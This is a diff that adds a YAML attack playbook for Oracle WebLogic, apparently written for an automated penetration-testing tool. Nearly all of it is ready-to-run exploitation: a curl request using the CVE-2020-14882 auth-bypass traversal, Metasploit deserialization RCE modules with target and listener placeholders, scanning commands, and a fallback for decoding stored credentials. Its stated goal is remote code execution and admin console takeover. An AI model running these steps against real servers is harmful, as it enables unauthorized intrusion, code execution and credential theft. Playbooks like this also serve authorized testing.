@@ -1,0 +1,45 @@
+id: tech_weblogic
+title: "Oracle WebLogic — T3 deserialization + console auth bypass (CVE-2020-14882)"
+phase: exploit
+mitre: ["T1190"]
+trigger:
+  services: ["http", "https", "weblogic"]
+  ports:    [80, 443, 7001, 7002, 7003, 7077]
+  technologies: ["weblogic", "oracle weblogic"]
+  cves:     ["CVE-2020-14882", "CVE-2020-14750", "CVE-2019-2725", "CVE-2017-10271", "CVE-2018-2628"]
+keywords: ["weblogic", "t3", "iiop", "wls-wsat", "weblogic console"]
+preconditions:
+  - "TCP/7001 reachable OR /console/ visible"
+steps:
+  - tool: curl
+    cmd:  "curl -s {base_url}/console/login/LoginForm.jsp | grep -oE 'WebLogic [0-9.]+ '"
+    why:  "Version disclosure"
+  - tool: curl
+    cmd:  "curl -s --path-as-is '{base_url}/console/css/%252e%252e%252fconsolejndi.portal'"
+    why:  "CVE-2020-14882 — auth bypass via double-URL-encoded traversal (WebLogic 10.3.6, 12.x, 14.1.1)"
+  - tool: nuclei
+    cmd:  "nuclei -tags weblogic -u {base_url}"
+    why:  "Sweep all WebLogic CVEs including chained auth-bypass + RCE"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/misc/weblogic_deserialize; set RHOSTS {target}; set RPORT 7001; set LHOST {LHOST}; run'"
+    why:  "T3 protocol deserialization RCE (CVE-2018-2628)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/misc/weblogic_deserialize_unicastref; set RHOSTS {target}; set RPORT 7001; set LHOST {LHOST}; run'"
+    why:  "CVE-2020-14882 chained with CVE-2020-14883 → unauth RCE"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/misc/weblogic_deserialize_asyncresponseservice; set RHOSTS {target}; set RPORT 7001; set LHOST {LHOST}; run'"
+    why:  "CVE-2019-2725 wls-wsat (10.3.6, 12.1.3)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/misc/weblogic_wsat_xml_decoder; set RHOSTS {target}; set RPORT 7001; set LHOST {LHOST}; run'"
+    why:  "CVE-2017-10271 wls-wsat XMLDecoder"
+  - tool: nmap
+    cmd:  "nmap -sV -p7001,7002 --script=weblogic-t3-info {target}"
+    why:  "T3 protocol fingerprint"
+expected_outcome: "Java RCE as oracle/weblogic user; admin console takeover via auth bypass"
+fallbacks:
+  - "T3 protocol filtered? → IIOP often left open on 7001"
+  - "/wls-wsat/CoordinatorPortType11 or /_async/AsyncResponseService — older XMLDecoder paths"
+  - "Decode SerializedSystemIni.dat for stored cleartext creds (boot.properties)"
+references:
+  - "https://www.oracle.com/security-alerts/"
+  - "https://github.com/Y4er/CVE-2020-14882"
